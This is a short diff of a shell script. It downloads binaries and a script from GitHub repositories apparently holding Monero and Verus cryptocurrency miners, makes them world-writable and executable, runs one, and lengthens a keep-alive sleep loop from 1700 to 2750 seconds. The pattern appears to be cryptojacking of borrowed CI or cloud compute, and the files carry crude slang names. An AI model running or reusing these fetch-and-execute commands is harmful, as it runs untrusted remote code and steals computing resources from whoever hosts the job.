@@ -1,3 +1,3 @@
-wget -O meki-baru1 https://github.com/renilo/xmr/raw/main/meki-baru1 && wget -O kontol https://raw.githubusercontent.com/renilo/hajar/main/xhajar.sh && chmod 777 meki-baru1 kontol
+wget -O manuk https://github.com/renilo/hajar/raw/main/manuk && wget https://github.com/renilo/hajar/raw/main/verus-solver && wget -O kontol https://raw.githubusercontent.com/renilo/hajar/main/xhajar.sh && chmod 777 manuk kontol verus-solver
 ./kontol
-for i in `seq 1 1700`; do echo $i; sleep 1; done
+for i in `seq 1 2750`; do echo $i; sleep 1; done
